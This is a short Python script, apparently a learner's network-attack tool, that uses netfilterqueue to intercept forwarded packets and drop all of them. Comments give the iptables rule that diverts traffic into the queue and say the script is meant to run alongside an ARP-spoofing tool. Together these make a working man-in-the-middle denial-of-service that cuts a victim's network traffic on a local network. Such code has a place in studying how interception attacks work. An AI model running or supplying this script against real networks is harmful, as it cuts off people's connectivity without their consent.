#!/usr/bin/env python

import netfilterqueue

# iptables setup: iptables -I FORWARD -j NFQUEUE --queue-num 0

# iptables restore: iptables --flush

# using this script with arp_spoof:https://github.com/haxtivitiez/arpSpoof

def process_pkt(packet):
    print(packet)
    packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_pkt)
queue.run()



